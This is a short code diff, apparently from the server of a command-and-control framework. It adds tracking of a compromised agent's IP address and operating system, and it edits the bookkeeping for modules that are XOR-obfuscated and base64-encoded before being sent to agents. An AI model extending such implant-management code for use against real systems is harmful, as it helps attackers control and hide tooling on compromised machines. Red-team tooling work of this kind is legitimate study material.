@@ -44,11 +44,16 @@ def _retrieve_results(task, result, errno):
             agent.hostname = _property
         if command == 'load':
             module_name = _property
+            print(_property)
             agent.loaded_modules = _property.lower() if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{_property.lower()}'
         if command == 'whoami':
             agent.username = _property
         if command == 'pid':
             agent.pid = _property
+        if command == 'ip':
+            agent.ip = _property
+        if command == 'os':
+            agent.os = _property
         if command == 'integrity':
             agent.integrity = _property
         if command == 'set sleep':
@@ -227,7 +232,6 @@ def new_task(data):
         module_name = available_modules[command][1].lower()
         module_resource = available_modules[command][0]
         if module_name not in agent.loaded_modules:
-            agent.loaded_modules = command if not agent.loaded_modules else ','.join(agent.loaded_modules) + f',{command}'
             with open(f'{os.getcwd()}{module_resource}', 'rb') as fd:
                 key, file = xor_base64(fd.read())
             task = TaskModel(name='load', description=f'load module {module_name} for {command}', agent=agent, arguments=f'{key},{file},{string_to_base64(command)}', type='1')
